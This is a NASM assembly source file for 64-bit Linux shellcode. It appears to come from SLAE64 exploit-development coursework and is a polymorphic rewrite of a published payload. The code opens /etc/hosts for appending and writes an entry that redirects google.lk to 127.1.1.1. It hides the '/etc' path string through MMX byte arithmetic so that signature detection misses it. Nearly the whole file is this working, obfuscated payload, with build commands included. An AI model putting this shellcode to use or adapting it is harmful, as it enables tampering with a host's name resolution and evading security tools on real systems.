; Author : SLAE64-PA-6470 (kahlon81)

; nasm -f elf64 shellcode-896-polymorphic2.nasm -o shellcode-896-polymorphic2.o
; ld shellcode-896-polymorphic2.o -o shellcode-896-polymorphic2

; Title: Add map in /etc/hosts file - 110 bytes
; Date: 2014-10-29
; Platform: linux/x86_64
; Website: http://osandamalith.wordpress.com
; Original author: Osanda Malith Jayathissa (@OsandaMalith)

global _start
    section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00
 
    ;mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov rcx, 0x1f1f1f1f5364551f  
    movq mm0, rcx               
    mov rcx, 0x1010101010101010 
    movq mm1, rcx
    paddusb mm0, mm1            
    movq r8, mm0
    emms   

    mov r10, 0x7374736f682f2f2f ; /cte/

    ;push r10
    mov qword [rsp - 8], r10
    sub rsp, 8

    push r8
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    add rax, 1 ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add rax, 3
    syscall

    ;exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'